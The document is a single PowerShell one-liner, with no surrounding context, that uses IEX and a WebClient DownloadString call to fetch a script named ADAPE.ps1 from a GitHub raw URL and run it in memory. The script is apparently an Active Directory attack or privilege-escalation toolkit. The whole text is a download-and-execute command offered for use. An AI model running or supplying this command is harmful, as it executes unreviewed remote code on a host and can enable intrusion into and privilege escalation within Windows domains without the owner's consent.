IEX (New-Object System.Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/hausec/ADAPE-Script/master/ADAPE.ps1’) ; ./ADAPE.ps1
